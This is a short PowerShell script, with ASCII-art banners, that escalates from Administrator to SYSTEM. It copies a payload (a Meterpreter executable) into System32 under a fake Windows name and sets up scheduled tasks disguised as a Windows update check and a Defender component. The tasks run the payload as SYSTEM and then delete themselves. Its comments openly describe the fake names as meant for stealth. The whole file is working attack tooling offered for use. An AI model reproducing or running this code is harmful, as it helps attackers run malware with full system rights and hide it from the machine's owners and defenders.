<#
 ┓      ┓       ┓  ┓   
┏┫┏┓┓┏┏┓┃┏┓┏┓┏┓┏┫  ┣┓┓┏
┗┻┗ ┗┛┗ ┗┗┛┣┛┗ ┗┻  ┗┛┗┫
           ┛          ┛
┳┓┏┓┓┏┏┓┏┓┓┏┓          
┃┃ ┫┣┫┣┫┃ ┃┫           
┻┛┗┛┛┗┛┗┗┛┛┗┛          
                                                    $$$$$$\  
                                                   $$  __$$\ 
$$\   $$\  $$$$$$\   $$$$$$$\        $$$$$$\$$$$\  $$ /  $$ |
$$ |  $$ | \____$$\ $$  _____|       $$  _$$  _$$\  $$$$$$  |
$$ |  $$ | $$$$$$$ |$$ /             $$ / $$ / $$ |$$  __$$< 
$$ |  $$ |$$  __$$ |$$ |             $$ | $$ | $$ |$$ /  $$ |
\$$$$$$  |\$$$$$$$ |\$$$$$$$\        $$ | $$ | $$ |\$$$$$$  |
 \______/  \_______| \_______|$$$$$$\\__| \__| \__| \______/ 
                              \______|                                                                                                                  
#>

# PowerShell Elevator from Administrator to NT Auth (Bypass Chain)

$payloadSource = "$env:Temp\meterpreter.exe" #It dont have to be meterpreter just be a creative
$payloadDest = "C:\Windows\System32\WindowsMSIPackageContent.exe" #Actually for Stealthy Operations
$task1 = "Windows Routine Update Check" #This is bs name for our payload mover
$task2 = "Windows Defender AMSI Activation" #This is bs name for our payload Starter

# Step 1: Move payload using Task 1
$action1 = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c copy `"$payloadSource`" `"$payloadDest`" && schtasks /Create /RU SYSTEM /SC ONCE /TN $task2 /TR `"cmd.exe /c $payloadDest && schtasks /Delete /TN $task1 /F && schtasks /Delete /TN $task2 /F`" /ST $(Get-Date).AddMinutes(2).ToString('HH:mm')"
$trigger1 = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1)
Register-ScheduledTask -Action $action1 -Trigger $trigger1 -TaskName $task1 -Description "Moves payload and sets SYSTEM task"
Write-Host "[+] Task '$task1' created. Wait 1-2 minutes for execution."
